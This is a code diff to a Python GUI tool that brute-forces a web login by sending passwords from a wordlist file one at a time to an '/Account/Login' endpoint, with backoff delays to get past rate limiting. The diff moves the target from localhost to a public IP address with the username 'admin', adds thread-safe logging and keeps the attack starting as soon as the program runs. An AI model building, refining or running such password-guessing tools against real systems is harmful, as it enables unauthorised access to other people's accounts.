@@ -3,9 +3,10 @@ from tkinter import scrolledtext
 import requests, threading, time, os
 
 # -------- CONFIG --------
-URL = "http://localhost:5038/Account/Login"
-USERNAME = "vandat"
-PASSFILE = "pass.txt"
+URL = "http://13.211.197.192:5000/Account/Login"
+USERNAME = "admin"
+# Make PASSFILE relative to script directory so it's found reliably
+PASSFILE = os.path.join(os.path.dirname(__file__), "pass.txt") if "__file__" in globals() else "pass.txt"
 
 BASE_DELAY = 0.5       # delay mặc định (giữ nhỏ)
 MAX_DELAY = 30         # delay tối đa giới hạn
@@ -18,6 +19,14 @@ responses = {}
 current_delay = BASE_DELAY
 # khóa để tránh race condition khi cập nhật current_delay
 delay_lock = threading.Lock()
+
+# helper to safely append to the log from background threads
+def safe_log(msg):
+    if 'root' in globals():
+        root.after(0, lambda: (log.insert(tk.END, msg), log.see(tk.END)))
+    else:
+        # fallback if root not yet created
+        print(msg)
 
 def send_one_password_with_backoff(pwd):
     """
@@ -93,7 +102,7 @@ def build_raw_response(r):
 # ========== GUI và luồng chính ==========
 def attack_thread():
     if not os.path.exists(PASSFILE):
-        log.insert(tk.END, f"Không tìm thấy file {PASSFILE}\n")
+        safe_log(f"Không tìm thấy file {PASSFILE}\n")
         return
 
     with open(PASSFILE, "r", encoding="utf-8") as f:
@@ -128,11 +137,10 @@ def attack_thread():
         # log và chờ theo current_delay (lấy bản sao an toàn)
         with delay_lock:
             wait = current_delay
-        log.insert(tk.END, f"Sent {pwd}. Waiting {wait}s before next.\n")
-        log.see(tk.END)
+        safe_log(f"Sent {pwd}. Waiting {wait}s before next.\n")
         time.sleep(wait)
 
-    log.insert(tk.END, "✅ Đã gửi xong toàn bộ.\n")
+    safe_log("✅ Đã gửi xong toàn bộ.\n")
 
 def on_select(event):
     sel = listbox.curselection()
@@ -185,7 +193,7 @@ status_label.pack(side="left", padx=10)
 log = scrolledtext.ScrolledText(root, height=6)
 log.pack(side="bottom", fill="x", padx=10, pady=6)
 
-# Start sending automatically when program runs
-threading.Thread(target=attack_thread, daemon=True).start()
+# Start sending automatically when program runs (start after mainloop begins)
+root.after(100, lambda: threading.Thread(target=attack_thread, daemon=True).start())
 
 root.mainloop()
